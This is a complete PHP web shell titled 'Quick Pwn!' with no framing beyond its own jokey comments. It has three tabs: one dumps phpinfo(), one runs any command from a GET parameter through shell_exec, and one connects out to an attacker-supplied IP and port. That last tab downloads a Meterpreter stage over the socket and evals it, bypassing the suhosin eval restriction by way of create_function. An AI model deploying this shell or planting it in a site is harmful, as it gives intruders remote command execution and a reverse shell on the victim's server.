

<!DOCTYPE html>
<html>
<style type="text/css">
	#head{
		color: red;	
	}

	/* tabs sytels */
.tab {
    overflow: hidden;
    border: 1px solid #ccc;
    background-color: #f1f1f1;
}

/* Style the buttons inside the tab */
.tab button {
    background-color: inherit;
    float: left;
    border: none;
    outline: none;
    cursor: pointer;
    padding: 14px 16px;
    transition: 0.3s;
    font-size: 17px;
}

/* Change background color of buttons on hover */
.tab button:hover {
    background-color: #ddd;
}

/* Create an active/current tablink class */
.tab button.active {
    background-color: #ccc;
}

/* Style the tab content */
.tabcontent {
    display: none;
    padding: 6px 12px;
    border: 1px solid #ccc;
    border-top: none;
}
</style>
<script type="text/javascript">
	/*Credits for loops below w3 school ;) */
function showTab(evt, tabName) {
    var i, tabcontent, tablinks;
    tabcontent = document.getElementsByClassName("tabcontent");

    for (i = 0; i < tabcontent.length; i++) {
        tabcontent[i].style.display = "none";
    }
    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) {
        tablinks[i].className = tablinks[i].className.replace(" active", "");
    }
    document.getElementById(tabName).style.display = "block";
    evt.currentTarget.className += " active";
    
    	command_output = document.getElementById("command_output");
        if(command_output != null){
    	command_output.style.display="none";
        }
    
}


</script>
<body>
 <h1 id="head"> Quick Pwn! </h1>
 <div class="tab">
  <button class="tablinks" onclick="showTab(event, 'sysinfo')">Sysinfo</button>
  <button class="tablinks" onclick="showTab(event, 'quickconnect')">Quick Connect</button>
  <button class="tablinks" onclick="showTab(event, 'com_exec')">Command Execution</button>
</div>

<div id="sysinfo" class="tabcontent">
  <h3>SystemInfo</h3>
  <p> <?= phpinfo()?></p>
</div>

<div id="quickconnect" class="tabcontent">
  <p style="color:red"> Meterpreter!! Enter the Remote details!! </p>
  <p> Make sure to start remote handler on localhost! TCP magic :P </p>
<form method="post" action="<?php echo $_SERVER['PHP_SELF'];?>"> <table>
	<tr>
  <td>IP of remote host:</td><td> <input type="text" name="remote_ip"> <br> </td> </tr>
  <tr><td>Port to connect:</td><td> <input type="text" name="remote_port"> <br></td>
 </tr>
 
</table><br>
<div id="but" style="padding-left:20% ">
<input type="submit" value="Connect"> 
</div>
</form>
 
</div>

<div id="com_exec" class="tabcontent">
  <h3>Enter the command to be executed!</h3>
  <form method="GET">
  	<input type="text" name="command"><br><br>
  	<input type="submit" name="com" id="exex" value="Execute!"> 
  </form>
</div>
 




</body>
</html>
<!-- MSF stuff, with a bit of error handling :P -->
<?php /**/
if($_SERVER["REQUEST_METHOD"] == "GET"){

	$output = shell_exec($_GET['command']);
echo "<p style='border: 1px solid #ccc;background-color: #ddd;' id='command_output'>$output</p>";
}
if($_SERVER["REQUEST_METHOD"] == "POST"){
error_reporting(0);
//$ip = '192.168.31.142';
$ip = $_POST['remote_ip'];
//$port = 4444;
$port= $_POST['remote_port'];
if (($f = 'stream_socket_client') && is_callable($f))
	{
	$s = $f("tcp://{$ip}:{$port}");
	$s_type = 'stream';
	}

if (!$s && ($f = 'fsockopen') && is_callable($f))
	{
	$s = $f($ip, $port);
	$s_type = 'stream';
	}

if (!$s && ($f = 'socket_create') && is_callable($f))
	{
	$s = $f(AF_INET, SOCK_STREAM, SOL_TCP);
	$res = @socket_connect($s, $ip, $port);
	if (!$res)
		{
			echo"<script>alert('Reconnect Meterpreter');</script>";
		die();
		}

	$s_type = 'socket';
	}

if (!$s_type)
	{
	 echo"<script>alert('Please reconnect to Meterpreter');</script>";
	die('no socket funcs');
	
	}

if (!$s)
	{
	echo"<script>alert('Please reconnect Meterpreter');</script>";
	die('no socket');
	
	}

switch ($s_type)
	{
case 'stream':
    
	$len = fread($s, 4);
	break;

case 'socket':

	$len = socket_read($s, 4);
	break;
	}

if (!$len)
	{
	die();
	
	}

$a = unpack("Nlen", $len);
$len = $a['len'];
$b = '';

while (strlen($b) < $len)
	{
	switch ($s_type)
		{
	case 'stream':
		$b.= fread($s, $len - strlen($b));
		break;

	case 'socket':
		$b.= socket_read($s, $len - strlen($b));
		break;
		}
	}

$GLOBALS['msgsock'] = $s;
$GLOBALS['msgsock_type'] = $s_type;

if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval'))
	{
	$suhosin_bypass = create_function('', $b);
	$suhosin_bypass();
	}
  else
	{
	eval($b);
	}

die(); 
}
?>